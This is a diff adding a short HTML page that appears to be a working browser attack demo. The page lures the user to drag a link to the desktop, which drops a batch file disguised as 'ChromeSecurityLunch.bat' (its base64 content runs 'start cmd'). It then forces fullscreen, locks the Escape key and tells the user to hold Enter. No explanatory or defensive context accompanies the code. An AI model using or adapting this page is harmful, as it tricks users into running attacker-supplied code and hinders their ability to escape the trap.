@@ -1,0 +1,27 @@
+<html><head></head><body>
+<br><br>
+<div id="uiLinkUrlDownload" ondragend="dragEnd()" draggable="true"><u> [[ Click Me & Drag Me To Desktop ]] </u></div>   
+<br><br> <br> <br> <br> <br> <br> <br> <br> <br> <br> <br> <br> <br> <br> <br> <br> <br> <br>           
+                           <Center> <h1 id="demo"></h1> </Center>
+                                                     
+<script>   
+
+function dragEnd() {
+ document.body.requestFullscreen();
+
+  document.getElementById("demo").style.color = 'white'
+
+   document.getElementById("demo").innerHTML = "Now Hold Enter! To Start Process";
+   
+   setTimeout(function () {
+      setTimeout('navigator.keyboard.lock(["Escape"]);', 1)
+  }, 500);
+
+}                                                                      
+  document.getElementById('uiLinkUrlDownload').ondragstart = function(event){    
+    event.dataTransfer.setData('DownloadURL',                                    
+      'text/plain:ChromeSecurityLunch.bat:data:text/plain;base64,c3RhcnQgY21k');
+
+  }                                                                              
+</script>     
+</body></html>
